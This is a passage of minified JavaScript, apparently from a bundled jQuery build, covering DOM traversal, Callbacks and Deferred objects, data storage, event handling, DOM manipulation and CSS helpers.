this.pushStack(o.length>1?f.uniqueSort(o):o)},index:function(t){return t?"string"==typeof t?a.call(f(t),this[0]):a.call(this,t.jquery?t[0]:t):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(t,e){return this.pushStack(f.uniqueSort(f.merge(this.get(),f(t,e))))},addBack:function(t){return this.add(null==t?this.prevObject:this.prevObject.filter(t))}}),f.each({parent:function(t){var e=t.parentNode;return e&&11!==e.nodeType?e:null},parents:function(t){return w(t,"parentNode")},parentsUntil:function(t,e,n){return w(t,"parentNode",n)},next:function(t){return I(t,"nextSibling")},prev:function(t){return I(t,"previousSibling")},nextAll:function(t){return w(t,"nextSibling")},prevAll:function(t){return w(t,"previousSibling")},nextUntil:function(t,e,n){return w(t,"nextSibling",n)},prevUntil:function(t,e,n){return w(t,"previousSibling",n)},siblings:function(t){return k((t.parentNode||{}).firstChild,t)},children:function(t){return k(t.firstChild)},contents:function(t){return t.contentDocument||f.merge([],t.childNodes)}},(function(t,e){f.fn[t]=function(n,i){var r=f.map(this,e,n);return"Until"!==t.slice(-5)&&(i=n),i&&"string"==typeof i&&(r=f.filter(i,r)),this.length>1&&(O[t]||f.uniqueSort(r),L.test(t)&&r.reverse()),this.pushStack(r)}}));var A,P=/\S+/g;function N(){i.removeEventListener("DOMContentLoaded",N),t.removeEventListener("load",N),f.ready()}f.Callbacks=function(t){t="string"==typeof t?function(t){var e={};return f.each(t.match(P)||[],(function(t,n){e[n]=!0})),e}(t):f.extend({},t);var e,n,i,r,o=[],s=[],a=-1,l=function(){for(r=t.once,i=e=!0;s.length;a=-1)for(n=s.shift();++a<o.length;)!1===o[a].apply(n[0],n[1])&&t.stopOnFalse&&(a=o.length,n=!1);t.memory||(n=!1),e=!1,r&&(o=n?[]:"")},c={add:function(){return o&&(n&&!e&&(a=o.length-1,s.push(n)),function e(n){f.each(n,(function(n,i){f.isFunction(i)?t.unique&&c.has(i)||o.push(i):i&&i.length&&"string"!==f.type(i)&&e(i)}))}(arguments),n&&!e&&l()),this},remove:function(){return f.each(arguments,(function(t,e){for(var n;(n=f.inArray(e,o,n))>-1;)o.splice(n,1),a>=n&&a--})),this},has:function(t){return t?f.inArray(t,o)>-1:o.length>0},empty:function(){return o&&(o=[]),this},disable:function(){return r=s=[],o=n="",this},disabled:function(){return!o},lock:function(){return r=s=[],n||(o=n=""),this},locked:function(){return!!r},fireWith:function(t,n){return r||(n=[t,(n=n||[]).slice?n.slice():n],s.push(n),e||l()),this},fire:function(){return c.fireWith(this,arguments),this},fired:function(){return!!i}};return c},f.extend({Deferred:function(t){var e=[["resolve","done",f.Callbacks("once memory"),"resolved"],["reject","fail",f.Callbacks("once memory"),"rejected"],["notify","progress",f.Callbacks("memory")]],n="pending",i={state:function(){return n},always:function(){return r.done(arguments).fail(arguments),this},then:function(){var t=arguments;return f.Deferred((function(n){f.each(e,(function(e,o){var s=f.isFunction(t[e])&&t[e];r[o[1]]((function(){var t=s&&s.apply(this,arguments);t&&f.isFunction(t.promise)?t.promise().progress(n.notify).done(n.resolve).fail(n.reject):n[o[0]+"With"](this===i?n.promise():this,s?[t]:arguments)}))})),t=null})).promise()},promise:function(t){return null!=t?f.extend(t,i):i}},r={};return i.pipe=i.then,f.each(e,(function(t,o){var s=o[2],a=o[3];i[o[1]]=s.add,a&&s.add((function(){n=a}),e[1^t][2].disable,e[2][2].lock),r[o[0]]=function(){return r[o[0]+"With"](this===r?i:this,arguments),this},r[o[0]+"With"]=s.fireWith})),i.promise(r),t&&t.call(r,r),r},when:function(t){var e,n,i,o=0,s=r.call(arguments),a=s.length,l=1!==a||t&&f.isFunction(t.promise)?a:0,c=1===l?t:f.Deferred(),u=function(t,n,i){return function(o){n[t]=this,i[t]=arguments.length>1?r.call(arguments):o,i===e?c.notifyWith(n,i):--l||c.resolveWith(n,i)}};if(a>1)for(e=new Array(a),n=new Array(a),i=new Array(a);a>o;o++)s[o]&&f.isFunction(s[o].promise)?s[o].promise().progress(u(o,n,e)).done(u(o,i,s)).fail(c.reject):--l;return l||c.resolveWith(i,s),c.promise()}}),f.fn.ready=function(t){return f.ready.promise().done(t),this},f.extend({isReady:!1,readyWait:1,holdReady:function(t){t?f.readyWait++:f.ready(!0)},ready:function(t){(!0===t?--f.readyWait:f.isReady)||(f.isReady=!0,!0!==t&&--f.readyWait>0||(A.resolveWith(i,[f]),f.fn.triggerHandler&&(f(i).triggerHandler("ready"),f(i).off("ready"))))}}),f.ready.promise=function(e){return A||(A=f.Deferred(),"complete"===i.readyState||"loading"!==i.readyState&&!i.documentElement.doScroll?t.setTimeout(f.ready):(i.addEventListener("DOMContentLoaded",N),t.addEventListener("load",N))),A.promise(e)},f.ready.promise();var B=function(t,e,n,i,r,o,s){var a=0,l=t.length,c=null==n;if("object"===f.type(n))for(a in r=!0,n)B(t,e,a,n[a],!0,o,s);else if(void 0!==i&&(r=!0,f.isFunction(i)||(s=!0),c&&(s?(e.call(t,i),e=null):(c=e,e=function(t,e,n){return c.call(f(t),n)})),e))for(;l>a;a++)e(t[a],n,s?i:i.call(t[a],a,e(t[a],n)));return r?t:c?e.call(t):l?e(t[0],n):o},D=function(t){return 1===t.nodeType||9===t.nodeType||!+t.nodeType};function R(){this.expando=f.expando+R.uid++}R.uid=1,R.prototype={register:function(t,e){var n=e||{};return t.nodeType?t[this.expando]=n:Object.defineProperty(t,this.expando,{value:n,writable:!0,configurable:!0}),t[this.expando]},cache:function(t){if(!D(t))return{};var e=t[this.expando];return e||(e={},D(t)&&(t.nodeType?t[this.expando]=e:Object.defineProperty(t,this.expando,{value:e,configurable:!0}))),e},set:function(t,e,n){var i,r=this.cache(t);if("string"==typeof e)r[e]=n;else for(i in e)r[i]=e[i];return r},get:function(t,e){return void 0===e?this.cache(t):t[this.expando]&&t[this.expando][e]},access:function(t,e,n){var i;return void 0===e||e&&"string"==typeof e&&void 0===n?void 0!==(i=this.get(t,e))?i:this.get(t,f.camelCase(e)):(this.set(t,e,n),void 0!==n?n:e)},remove:function(t,e){var n,i,r,o=t[this.expando];if(void 0!==o){if(void 0===e)this.register(t);else{f.isArray(e)?i=e.concat(e.map(f.camelCase)):(r=f.camelCase(e),e in o?i=[e,r]:i=(i=r)in o?[i]:i.match(P)||[]),n=i.length;for(;n--;)delete o[i[n]]}(void 0===e||f.isEmptyObject(o))&&(t.nodeType?t[this.expando]=void 0:delete t[this.expando])}},hasData:function(t){var e=t[this.expando];return void 0!==e&&!f.isEmptyObject(e)}};var j=new R,M=new R,F=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,q=/[A-Z]/g;function H(t,e,n){var i;if(void 0===n&&1===t.nodeType)if(i="data-"+e.replace(q,"-$&").toLowerCase(),"string"==typeof(n=t.getAttribute(i))){try{n="true"===n||"false"!==n&&("null"===n?null:+n+""===n?+n:F.test(n)?f.parseJSON(n):n)}catch(t){}M.set(t,e,n)}else n=void 0;return n}f.extend({hasData:function(t){return M.hasData(t)||j.hasData(t)},data:function(t,e,n){return M.access(t,e,n)},removeData:function(t,e){M.remove(t,e)},_data:function(t,e,n){return j.access(t,e,n)},_removeData:function(t,e){j.remove(t,e)}}),f.fn.extend({data:function(t,e){var n,i,r,o=this[0],s=o&&o.attributes;if(void 0===t){if(this.length&&(r=M.get(o),1===o.nodeType&&!j.get(o,"hasDataAttrs"))){for(n=s.length;n--;)s[n]&&(0===(i=s[n].name).indexOf("data-")&&(i=f.camelCase(i.slice(5)),H(o,i,r[i])));j.set(o,"hasDataAttrs",!0)}return r}return"object"==typeof t?this.each((function(){M.set(this,t)})):B(this,(function(e){var n,i;if(o&&void 0===e){if(void 0!==(n=M.get(o,t)||M.get(o,t.replace(q,"-$&").toLowerCase())))return n;if(i=f.camelCase(t),void 0!==(n=M.get(o,i)))return n;if(void 0!==(n=H(o,i,void 0)))return n}else i=f.camelCase(t),this.each((function(){var n=M.get(this,i);M.set(this,i,e),t.indexOf("-")>-1&&void 0!==n&&M.set(this,t,e)}))}),null,e,arguments.length>1,null,!0)},removeData:function(t){return this.each((function(){M.remove(this,t)}))}}),f.extend({queue:function(t,e,n){var i;return t?(e=(e||"fx")+"queue",i=j.get(t,e),n&&(!i||f.isArray(n)?i=j.access(t,e,f.makeArray(n)):i.push(n)),i||[]):void 0},dequeue:function(t,e){e=e||"fx";var n=f.queue(t,e),i=n.length,r=n.shift(),o=f._queueHooks(t,e);"inprogress"===r&&(r=n.shift(),i--),r&&("fx"===e&&n.unshift("inprogress"),delete o.stop,r.call(t,(function(){f.dequeue(t,e)}),o)),!i&&o&&o.empty.fire()},_queueHooks:function(t,e){var n=e+"queueHooks";return j.get(t,n)||j.access(t,n,{empty:f.Callbacks("once memory").add((function(){j.remove(t,[e+"queue",n])}))})}}),f.fn.extend({queue:function(t,e){var n=2;return"string"!=typeof t&&(e=t,t="fx",n--),arguments.length<n?f.queue(this[0],t):void 0===e?this:this.each((function(){var n=f.queue(this,t,e);f._queueHooks(this,t),"fx"===t&&"inprogress"!==n[0]&&f.dequeue(this,t)}))},dequeue:function(t){return this.each((function(){f.dequeue(this,t)}))},clearQueue:function(t){return this.queue(t||"fx",[])},promise:function(t,e){var n,i=1,r=f.Deferred(),o=this,s=this.length,a=function(){--i||r.resolveWith(o,[o])};for("string"!=typeof t&&(e=t,t=void 0),t=t||"fx";s--;)(n=j.get(o[s],t+"queueHooks"))&&n.empty&&(i++,n.empty.add(a));return a(),r.promise(e)}});var W=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,z=new RegExp("^(?:([+-])=|)("+W+")([a-z%]*)$","i"),U=["Top","Right","Bottom","Left"],Z=function(t,e){return t=e||t,"none"===f.css(t,"display")||!f.contains(t.ownerDocument,t)};function V(t,e,n,i){var r,o=1,s=20,a=i?function(){return i.cur()}:function(){return f.css(t,e,"")},l=a(),c=n&&n[3]||(f.cssNumber[e]?"":"px"),u=(f.cssNumber[e]||"px"!==c&&+l)&&z.exec(f.css(t,e));if(u&&u[3]!==c){c=c||u[3],n=n||[],u=+l||1;do{u/=o=o||".5",f.style(t,e,u+c)}while(o!==(o=a()/l)&&1!==o&&--s)}return n&&(u=+u||+l||0,r=n[1]?u+(n[1]+1)*n[2]:+n[2],i&&(i.unit=c,i.start=u,i.end=r)),r}var K=/^(?:checkbox|radio)$/i,X=/<([\w:-]+)/,Y=/^$|\/(?:java|ecma)script/i,G={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};function Q(t,e){var n=void 0!==t.getElementsByTagName?t.getElementsByTagName(e||"*"):void 0!==t.querySelectorAll?t.querySelectorAll(e||"*"):[];return void 0===e||e&&f.nodeName(t,e)?f.merge([t],n):n}function J(t,e){for(var n=0,i=t.length;i>n;n++)j.set(t[n],"globalEval",!e||j.get(e[n],"globalEval"))}G.optgroup=G.option,G.tbody=G.tfoot=G.colgroup=G.caption=G.thead,G.th=G.td;var tt=/<|&#?\w+;/;function et(t,e,n,i,r){for(var o,s,a,l,c,u,d=e.createDocumentFragment(),h=[],p=0,g=t.length;g>p;p++)if((o=t[p])||0===o)if("object"===f.type(o))f.merge(h,o.nodeType?[o]:o);else if(tt.test(o)){for(s=s||d.appendChild(e.createElement("div")),a=(X.exec(o)||["",""])[1].toLowerCase(),l=G[a]||G._default,s.innerHTML=l[1]+f.htmlPrefilter(o)+l[2],u=l[0];u--;)s=s.lastChild;f.merge(h,s.childNodes),(s=d.firstChild).textContent=""}else h.push(e.createTextNode(o));for(d.textContent="",p=0;o=h[p++];)if(i&&f.inArray(o,i)>-1)r&&r.push(o);else if(c=f.contains(o.ownerDocument,o),s=Q(d.appendChild(o),"script"),c&&J(s),n)for(u=0;o=s[u++];)Y.test(o.type||"")&&n.push(o);return d}!function(){var t=i.createDocumentFragment().appendChild(i.createElement("div")),e=i.createElement("input");e.setAttribute("type","radio"),e.setAttribute("checked","checked"),e.setAttribute("name","t"),t.appendChild(e),d.checkClone=t.cloneNode(!0).cloneNode(!0).lastChild.checked,t.innerHTML="<textarea>x</textarea>",d.noCloneChecked=!!t.cloneNode(!0).lastChild.defaultValue}();var nt=/^key/,it=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,rt=/^([^.]*)(?:\.(.+)|)/;function ot(){return!0}function st(){return!1}function at(){try{return i.activeElement}catch(t){}}function lt(t,e,n,i,r,o){var s,a;if("object"==typeof e){for(a in"string"!=typeof n&&(i=i||n,n=void 0),e)lt(t,a,n,i,e[a],o);return t}if(null==i&&null==r?(r=n,i=n=void 0):null==r&&("string"==typeof n?(r=i,i=void 0):(r=i,i=n,n=void 0)),!1===r)r=st;else if(!r)return t;return 1===o&&(s=r,r=function(t){return f().off(t),s.apply(this,arguments)},r.guid=s.guid||(s.guid=f.guid++)),t.each((function(){f.event.add(this,e,r,i,n)}))}f.event={global:{},add:function(t,e,n,i,r){var o,s,a,l,c,u,d,h,p,g,m,v=j.get(t);if(v)for(n.handler&&(n=(o=n).handler,r=o.selector),n.guid||(n.guid=f.guid++),(l=v.events)||(l=v.events={}),(s=v.handle)||(s=v.handle=function(e){return void 0!==f&&f.event.triggered!==e.type?f.event.dispatch.apply(t,arguments):void 0}),c=(e=(e||"").match(P)||[""]).length;c--;)p=m=(a=rt.exec(e[c])||[])[1],g=(a[2]||"").split(".").sort(),p&&(d=f.event.special[p]||{},p=(r?d.delegateType:d.bindType)||p,d=f.event.special[p]||{},u=f.extend({type:p,origType:m,data:i,handler:n,guid:n.guid,selector:r,needsContext:r&&f.expr.match.needsContext.test(r),namespace:g.join(".")},o),(h=l[p])||((h=l[p]=[]).delegateCount=0,d.setup&&!1!==d.setup.call(t,i,g,s)||t.addEventListener&&t.addEventListener(p,s)),d.add&&(d.add.call(t,u),u.handler.guid||(u.handler.guid=n.guid)),r?h.splice(h.delegateCount++,0,u):h.push(u),f.event.global[p]=!0)},remove:function(t,e,n,i,r){var o,s,a,l,c,u,d,h,p,g,m,v=j.hasData(t)&&j.get(t);if(v&&(l=v.events)){for(c=(e=(e||"").match(P)||[""]).length;c--;)if(p=m=(a=rt.exec(e[c])||[])[1],g=(a[2]||"").split(".").sort(),p){for(d=f.event.special[p]||{},h=l[p=(i?d.delegateType:d.bindType)||p]||[],a=a[2]&&new RegExp("(^|\\.)"+g.join("\\.(?:.*\\.|)")+"(\\.|$)"),s=o=h.length;o--;)u=h[o],!r&&m!==u.origType||n&&n.guid!==u.guid||a&&!a.test(u.namespace)||i&&i!==u.selector&&("**"!==i||!u.selector)||(h.splice(o,1),u.selector&&h.delegateCount--,d.remove&&d.remove.call(t,u));s&&!h.length&&(d.teardown&&!1!==d.teardown.call(t,g,v.handle)||f.removeEvent(t,p,v.handle),delete l[p])}else for(p in l)f.event.remove(t,p+e[c],n,i,!0);f.isEmptyObject(l)&&j.remove(t,"handle events")}},dispatch:function(t){t=f.event.fix(t);var e,n,i,o,s,a=[],l=r.call(arguments),c=(j.get(this,"events")||{})[t.type]||[],u=f.event.special[t.type]||{};if(l[0]=t,t.delegateTarget=this,!u.preDispatch||!1!==u.preDispatch.call(this,t)){for(a=f.event.handlers.call(this,t,c),e=0;(o=a[e++])&&!t.isPropagationStopped();)for(t.currentTarget=o.elem,n=0;(s=o.handlers[n++])&&!t.isImmediatePropagationStopped();)t.rnamespace&&!t.rnamespace.test(s.namespace)||(t.handleObj=s,t.data=s.data,void 0!==(i=((f.event.special[s.origType]||{}).handle||s.handler).apply(o.elem,l))&&!1===(t.result=i)&&(t.preventDefault(),t.stopPropagation()));return u.postDispatch&&u.postDispatch.call(this,t),t.result}},handlers:function(t,e){var n,i,r,o,s=[],a=e.delegateCount,l=t.target;if(a&&l.nodeType&&("click"!==t.type||isNaN(t.button)||t.button<1))for(;l!==this;l=l.parentNode||this)if(1===l.nodeType&&(!0!==l.disabled||"click"!==t.type)){for(i=[],n=0;a>n;n++)void 0===i[r=(o=e[n]).selector+" "]&&(i[r]=o.needsContext?f(r,this).index(l)>-1:f.find(r,this,null,[l]).length),i[r]&&i.push(o);i.length&&s.push({elem:l,handlers:i})}return a<e.length&&s.push({elem:this,handlers:e.slice(a)}),s},props:"altKey bubbles cancelable ctrlKey currentTarget detail eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(t,e){return null==t.which&&(t.which=null!=e.charCode?e.charCode:e.keyCode),t}},mouseHooks:{props:"button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(t,e){var n,r,o,s=e.button;return null==t.pageX&&null!=e.clientX&&(r=(n=t.target.ownerDocument||i).documentElement,o=n.body,t.pageX=e.clientX+(r&&r.scrollLeft||o&&o.scrollLeft||0)-(r&&r.clientLeft||o&&o.clientLeft||0),t.pageY=e.clientY+(r&&r.scrollTop||o&&o.scrollTop||0)-(r&&r.clientTop||o&&o.clientTop||0)),t.which||void 0===s||(t.which=1&s?1:2&s?3:4&s?2:0),t}},fix:function(t){if(t[f.expando])return t;var e,n,r,o=t.type,s=t,a=this.fixHooks[o];for(a||(this.fixHooks[o]=a=it.test(o)?this.mouseHooks:nt.test(o)?this.keyHooks:{}),r=a.props?this.props.concat(a.props):this.props,t=new f.Event(s),e=r.length;e--;)t[n=r[e]]=s[n];return t.target||(t.target=i),3===t.target.nodeType&&(t.target=t.target.parentNode),a.filter?a.filter(t,s):t},special:{load:{noBubble:!0},focus:{trigger:function(){return this!==at()&&this.focus?(this.focus(),!1):void 0},delegateType:"focusin"},blur:{trigger:function(){return this===at()&&this.blur?(this.blur(),!1):void 0},delegateType:"focusout"},click:{trigger:function(){return"checkbox"===this.type&&this.click&&f.nodeName(this,"input")?(this.click(),!1):void 0},_default:function(t){return f.nodeName(t.target,"a")}},beforeunload:{postDispatch:function(t){void 0!==t.result&&t.originalEvent&&(t.originalEvent.returnValue=t.result)}}}},f.removeEvent=function(t,e,n){t.removeEventListener&&t.removeEventListener(e,n)},f.Event=function(t,e){return this instanceof f.Event?(t&&t.type?(this.originalEvent=t,this.type=t.type,this.isDefaultPrevented=t.defaultPrevented||void 0===t.defaultPrevented&&!1===t.returnValue?ot:st):this.type=t,e&&f.extend(this,e),this.timeStamp=t&&t.timeStamp||f.now(),void(this[f.expando]=!0)):new f.Event(t,e)},f.Event.prototype={constructor:f.Event,isDefaultPrevented:st,isPropagationStopped:st,isImmediatePropagationStopped:st,isSimulated:!1,preventDefault:function(){var t=this.originalEvent;this.isDefaultPrevented=ot,t&&!this.isSimulated&&t.preventDefault()},stopPropagation:function(){var t=this.originalEvent;this.isPropagationStopped=ot,t&&!this.isSimulated&&t.stopPropagation()},stopImmediatePropagation:function(){var t=this.originalEvent;this.isImmediatePropagationStopped=ot,t&&!this.isSimulated&&t.stopImmediatePropagation(),this.stopPropagation()}},f.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},(function(t,e){f.event.special[t]={delegateType:e,bindType:e,handle:function(t){var n,i=t.relatedTarget,r=t.handleObj;return i&&(i===this||f.contains(this,i))||(t.type=r.origType,n=r.handler.apply(this,arguments),t.type=e),n}}})),f.fn.extend({on:function(t,e,n,i){return lt(this,t,e,n,i)},one:function(t,e,n,i){return lt(this,t,e,n,i,1)},off:function(t,e,n){var i,r;if(t&&t.preventDefault&&t.handleObj)return i=t.handleObj,f(t.delegateTarget).off(i.namespace?i.origType+"."+i.namespace:i.origType,i.selector,i.handler),this;if("object"==typeof t){for(r in t)this.off(r,e,t[r]);return this}return!1!==e&&"function"!=typeof e||(n=e,e=void 0),!1===n&&(n=st),this.each((function(){f.event.remove(this,t,n,e)}))}});var ct=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi,ut=/<script|<style|<link/i,dt=/checked\s*(?:[^=]|=\s*.checked.)/i,ht=/^true\/(.*)/,ft=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;function pt(t,e){return f.nodeName(t,"table")&&f.nodeName(11!==e.nodeType?e:e.firstChild,"tr")?t.getElementsByTagName("tbody")[0]||t.appendChild(t.ownerDocument.createElement("tbody")):t}function gt(t){return t.type=(null!==t.getAttribute("type"))+"/"+t.type,t}function mt(t){var e=ht.exec(t.type);return e?t.type=e[1]:t.removeAttribute("type"),t}function vt(t,e){var n,i,r,o,s,a,l,c;if(1===e.nodeType){if(j.hasData(t)&&(o=j.access(t),s=j.set(e,o),c=o.events))for(r in delete s.handle,s.events={},c)for(n=0,i=c[r].length;i>n;n++)f.event.add(e,r,c[r][n]);M.hasData(t)&&(a=M.access(t),l=f.extend({},a),M.set(e,l))}}function yt(t,e){var n=e.nodeName.toLowerCase();"input"===n&&K.test(t.type)?e.checked=t.checked:"input"!==n&&"textarea"!==n||(e.defaultValue=t.defaultValue)}function bt(t,e,n,i){e=o.apply([],e);var r,s,a,l,c,u,h=0,p=t.length,g=p-1,m=e[0],v=f.isFunction(m);if(v||p>1&&"string"==typeof m&&!d.checkClone&&dt.test(m))return t.each((function(r){var o=t.eq(r);v&&(e[0]=m.call(this,r,o.html())),bt(o,e,n,i)}));if(p&&(s=(r=et(e,t[0].ownerDocument,!1,t,i)).firstChild,1===r.childNodes.length&&(r=s),s||i)){for(l=(a=f.map(Q(r,"script"),gt)).length;p>h;h++)c=r,h!==g&&(c=f.clone(c,!0,!0),l&&f.merge(a,Q(c,"script"))),n.call(t[h],c,h);if(l)for(u=a[a.length-1].ownerDocument,f.map(a,mt),h=0;l>h;h++)c=a[h],Y.test(c.type||"")&&!j.access(c,"globalEval")&&f.contains(u,c)&&(c.src?f._evalUrl&&f._evalUrl(c.src):f.globalEval(c.textContent.replace(ft,"")))}return t}function wt(t,e,n){for(var i,r=e?f.filter(e,t):t,o=0;null!=(i=r[o]);o++)n||1!==i.nodeType||f.cleanData(Q(i)),i.parentNode&&(n&&f.contains(i.ownerDocument,i)&&J(Q(i,"script")),i.parentNode.removeChild(i));return t}f.extend({htmlPrefilter:function(t){return t.replace(ct,"<$1></$2>")},clone:function(t,e,n){var i,r,o,s,a=t.cloneNode(!0),l=f.contains(t.ownerDocument,t);if(!(d.noCloneChecked||1!==t.nodeType&&11!==t.nodeType||f.isXMLDoc(t)))for(s=Q(a),i=0,r=(o=Q(t)).length;r>i;i++)yt(o[i],s[i]);if(e)if(n)for(o=o||Q(t),s=s||Q(a),i=0,r=o.length;r>i;i++)vt(o[i],s[i]);else vt(t,a);return(s=Q(a,"script")).length>0&&J(s,!l&&Q(t,"script")),a},cleanData:function(t){for(var e,n,i,r=f.event.special,o=0;void 0!==(n=t[o]);o++)if(D(n)){if(e=n[j.expando]){if(e.events)for(i in e.events)r[i]?f.event.remove(n,i):f.removeEvent(n,i,e.handle);n[j.expando]=void 0}n[M.expando]&&(n[M.expando]=void 0)}}}),f.fn.extend({domManip:bt,detach:function(t){return wt(this,t,!0)},remove:function(t){return wt(this,t)},text:function(t){return B(this,(function(t){return void 0===t?f.text(this):this.empty().each((function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=t)}))}),null,t,arguments.length)},append:function(){return bt(this,arguments,(function(t){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||pt(this,t).appendChild(t)}))},prepend:function(){return bt(this,arguments,(function(t){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var e=pt(this,t);e.insertBefore(t,e.firstChild)}}))},before:function(){return bt(this,arguments,(function(t){this.parentNode&&this.parentNode.insertBefore(t,this)}))},after:function(){return bt(this,arguments,(function(t){this.parentNode&&this.parentNode.insertBefore(t,this.nextSibling)}))},empty:function(){for(var t,e=0;null!=(t=this[e]);e++)1===t.nodeType&&(f.cleanData(Q(t,!1)),t.textContent="");return this},clone:function(t,e){return t=null!=t&&t,e=null==e?t:e,this.map((function(){return f.clone(this,t,e)}))},html:function(t){return B(this,(function(t){var e=this[0]||{},n=0,i=this.length;if(void 0===t&&1===e.nodeType)return e.innerHTML;if("string"==typeof t&&!ut.test(t)&&!G[(X.exec(t)||["",""])[1].toLowerCase()]){t=f.htmlPrefilter(t);try{for(;i>n;n++)1===(e=this[n]||{}).nodeType&&(f.cleanData(Q(e,!1)),e.innerHTML=t);e=0}catch(t){}}e&&this.empty().append(t)}),null,t,arguments.length)},replaceWith:function(){var t=[];return bt(this,arguments,(function(e){var n=this.parentNode;f.inArray(this,t)<0&&(f.cleanData(Q(this)),n&&n.replaceChild(e,this))}),t)}}),f.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},(function(t,e){f.fn[t]=function(t){for(var n,i=[],r=f(t),o=r.length-1,a=0;o>=a;a++)n=a===o?this:this.clone(!0),f(r[a])[e](n),s.apply(i,n.get());return this.pushStack(i)}}));var kt,xt={HTML:"block",BODY:"block"};function _t(t,e){var n=f(e.createElement(t)).appendTo(e.body),i=f.css(n[0],"display");return n.detach(),i}function St(t){var e=i,n=xt[t];return n||("none"!==(n=_t(t,e))&&n||((e=(kt=(kt||f("<iframe frameborder='0' width='0' height='0'/>")).appendTo(e.documentElement))[0].contentDocument).write(),e.close(),n=_t(t,e),kt.detach()),xt[t]=n),n}var Ct=/^margin/,$t=new RegExp("^("+W+")(?!px)[a-z%]+$","i"),Et=function(e){var n=e.ownerDocument.defaultView;return n&&n.opener||(n=t),n.getComputedStyle(e)},Tt=function(t,e,n,i){var r,o,s={};for(o in e)s[o]=t.style[o],t.style[o]=e[o];for(o in r=n.apply(t,i||[]),e)t.style[o]=s[o];return r},Lt=i.documentElement;function Ot(t,e,n){var i,r,o,s,a=t.style;return""!==(s=(n=n||Et(t))?n.getPropertyValue(e)||n[e]:void 0)&&void 0!==s||f.contains(t.ownerDocument,t)||(s=f.style(t,e)),n&&!d.pixelMarginRight()&&$t.test(s)&&Ct.test(e)&&(i=a.width,r=a.minWidth,o=a.maxWidth,a.minWidth=a.maxWidth=a.width=s,s=n.width,a.width=i,a.minWidth=r,a.maxWidth=o),void 0!==s?s+"":s}function It(t,e){return{get:function(){return t()?void delete this.get:(this.get=e).apply(this,arguments)}}}!function(){var e,n,r,o,s=i.createElement("div"),a=i.createElement("div");if(a.style){function l(){a.style.cssText="-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%",a.innerHTML="",Lt.appendChild(s);var i=t.getComputedStyle(a);e="1%"!==i.top,o="2px"===i.marginLeft,n="4px"===i.width,a.style.marginRight="50%",r="4px"===i.marginRight,Lt.removeChild(s)}a.style.backgroundClip="content-box",a.cloneNode(!0).style.backgroundClip="",d.clearCloneStyle="content-box"===a.style.backgroundClip,s.style.cssText="border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute",s.appendChild(a),f.extend(d,{pixelPosition:function(){return l(),e},boxSizingReliable:function(){return null==n&&l(),n},pixelMarginRight:function(){return null==n&&l(),r},reliableMarginLeft:function(){return null==n&&l(),o},reliableMarginRight:function(){var e,n=a.appendChild(i.createElement("div"));return n.style.cssText=a.style.cssText="-webkit-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0",n.style.marginRight=n.style.width="0",a.style.width="1px",Lt.appendChild(s),e=!parseFloat(t.getComputedStyle(n).marginRight),Lt.removeChild(s),a.removeChild(n),e}})}}();var At=/^(none|table(?!-c[ea]).+)/,Pt={position:"absolute",visibility:"hidden",display:"block"},Nt={letterSpacing:"0",fontWeight:"400"},Bt=["Webkit","O","Moz","ms"],Dt=i.createElement("div").style;function Rt(t){if(t in Dt)return t;for(var e=t[0].toUpperCase()+t.slice(1),n=Bt.length;n--;)if((t=Bt[n]+e)in Dt)return t}function jt(t,e,n){var i=z.exec(e);return i?Math.max(0,i[2]-(n||0))+(i[3]||"px"):e}function Mt(t,e,n,i,r){for(var o=n===(i?"border":"content")?4:"width"===e?1:0,s=0;4>o;o+=2)"margin"===n&&(s+=f.css(t,n+U[o],!0,r)),i?("content"===n&&(s-=f.css(t,"padding"+U[o],!0,r)),"margin"!==n&&(s-=f.css(t,"border"+U[o]+"Width",!0,r))):(s+=f.css(t,"padding"+U[o],!0,r),"padding"!==n&&(s+=f.css(t,"border"+U[o]+"Width",!0,r)));return s}function Ft(t,e,n){var i=!0,r="width"===e?t.offsetWidth:t.offsetHeight,o=Et(t),s="border-box"===f.css(t,"boxSizing",!1,o);if(0>=r||null==r){if((0>(r=Ot(t,e,o))||null==r)&&(r=t.style[e]),$t.test(r))return r;i=s&&(d.boxSizingReliable()||r===t.style[e]),r=parseFloat(r)||0}return r+Mt(t,e,n||(s?"border":"content"),i,o)+"px"}function qt(t,e){for(var n,i,r,o=[],s=0,a=t.length;a>s;s++)(i=t[s]).style&&(o[s]=j.get(i,"olddisplay"),n=i.style.display,e?(o[s]||"none"!==n||(i.style.display=""),""===i.style.display&&Z(i)&&(o[s]=j.access(i,"olddisplay",St(i.nodeName)))):(r=Z(i),"none"===n&&r||j.set(i,"olddisplay",r?n:f.css(i,"display"))));for(s=0;a>s;s++)(i=t[s]).style&&(e&&"none"!==i.style.display&&""!==i.style.display||(i.style.display=e?o[s]||"":"none"));return t}function Ht(t,e,n,i,r){return new Ht.prototype.init(t,e,n,i,r)}f.extend({cssHooks:{opacity:{get:function(t,e){if(e){var 